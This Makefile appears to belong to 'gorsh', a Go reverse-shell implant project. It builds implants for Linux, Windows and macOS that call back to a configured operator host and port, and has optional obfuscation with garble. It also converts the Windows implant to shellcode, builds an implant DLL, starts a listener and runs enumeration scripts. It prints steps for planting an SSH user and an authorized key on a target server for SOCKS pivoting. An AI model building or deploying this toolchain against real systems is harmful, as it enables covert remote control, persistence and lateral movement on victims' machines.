APP = gorsh
OUT = build

SRV_KEY = certs/server.key
SRV_PEM = certs/server.pem
PKEY = internal/sshocks/conf/id_ed25519

# BUILD=garble -tiny build
BUILD=go build -trimpath -buildmode=pie

PLATFORMS=linux windows darwin
target=$(word 1, $@)

LHOST ?= 127.0.0.1
LPORT ?= 8443

FINGERPRINT = $(shell openssl x509 -fingerprint -sha256 -noout -in ${SRV_PEM} | cut -d '=' -f2)
LD.windows = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
LD.linux = "-s -w -X main.connectString=${LHOST}:${LPORT} -X main.fingerPrint=${FINGERPRINT}"
LD.darwin = ${LD.linux}

GARBLE=${GOPATH}/bin/garble
GODONUT=${GOPATH}/bin/go-donut
MINGW=x86_64-w64-mingw32-gcc
CXX=x86_64-w64-mingw32-g++


# zStd is a highly efficient compression library that requires CGO compilation If you'd like to
# turn this feature on and have experience cross-compiling with cgo, enable the feature below for
# win/64 and linux/64 implants
# ZSTD=-tags zstd

all: $(PLATFORMS) servers

${PLATFORMS}: $(GARBLE) $(PKEY) $(SRV_KEY)
	GOOS=${target} ${BUILD} -ldflags ${LD.${target}} \
			 -o ${OUT}/${APP}.${target} \
			 cmd/gorsh/*

listen listen-socat: $(SRV_KEY)
	KEY=${SRV_KEY} \
			PEM=${SRV_PEM} \
			LISTEN=scripts/${target}.sh \
			scripts/start.sh

server:
	GOOS=linux ${BUILD} -ldflags ${LD.linux} \
		-o ${OUT}/srv/gorsh-server \
		cmd/gorsh-listen/*

shellcode: $(GODONUT) windows
	${GODONUT} --arch x64 --verbose \
		--in ${OUT}/${APP}.windows \
		--out ${OUT}/${APP}-windows-sc.bin \

dll:
	GOOS=windows CGO_ENABLED=1 CC=${MINGW} \
	go build \
		-buildmode=c-shared \
		-trimpath \
		-ldflags ${LD.windows} \
		-o ${OUT}/${APP}.windows.dll \
		cmd/gorsh-dll/dllmain.go

clean:
	rm -rf ${OUT} ${PKEY}* certs/*

enumscripts:
	@echo Updating Enum Scripts
	bash scripts/prepare_enum_scripts.sh


## Dependency Management

$(GARBLE):
	go get mvdan.cc/garble

$(GODONUT):
	go get github.com/Binject/go-donut

$(PKEY):
	ssh-keygen -t ed25519 -f ${target} -N ''
	@echo
	@echo "================================================="
	@echo "                 IMPORTANT"
	@echo "================================================="
	@echo
	@echo "# The following creates a user with a /bin/false shell on the target ssh server."
	@echo "# And appends the generated key to that user's authorized_keys file"
	@echo
	@echo "HDIR=/home/sshuser"
	@echo "useradd -s /bin/false -m -d \$${HDIR} -N sshuser"
	@echo "mkdir -p \$${HDIR}/.ssh"
	@echo "cat <<EOF >> \$${HDIR}/.ssh/authorized_keys"
	@echo "NO-X11-FORWARDING,PERMITOPEN=\"0.0.0.0:1080\" `cat ${target}.pub`"
	@echo "EOF"
	@echo
	@echo "# If you know your target's public IP, you can also prepend the above with:"
	@echo "FROM=<ip or hostname>"
	@echo


$(SRV_KEY) $(SRV_PEM) &:
	openssl req -subj '/CN=localhost/O=Localhost/C=US' -new -newkey rsa:4096 -days 3650 -nodes -x509 -keyout ${SRV_KEY} -out ${SRV_PEM}
	@cat ${SRV_KEY} >> ${SRV_PEM}

.PHONY: $(PLATFORMS) clean listen server listen-socat
